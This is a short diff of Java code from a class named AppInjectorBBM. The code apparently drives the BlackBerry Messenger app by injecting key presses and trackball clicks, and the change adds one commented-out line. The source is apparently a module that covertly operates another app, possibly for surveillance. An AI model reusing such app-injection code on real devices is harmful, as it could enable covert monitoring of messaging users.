@@ -72,6 +72,7 @@ public class AppInjectorBBM implements AppInjectorInterface, Singleton {
             KeyInjector.pressRawKey(menu.toString().toLowerCase().charAt(0));
             Utils.sleep(500);
             KeyInjector.trackBallRawClick();
+            //KeyInjector.trackBallClick();
         }else{
             //#ifdef DEBUG
             debug.trace("callMenuByKey press key");
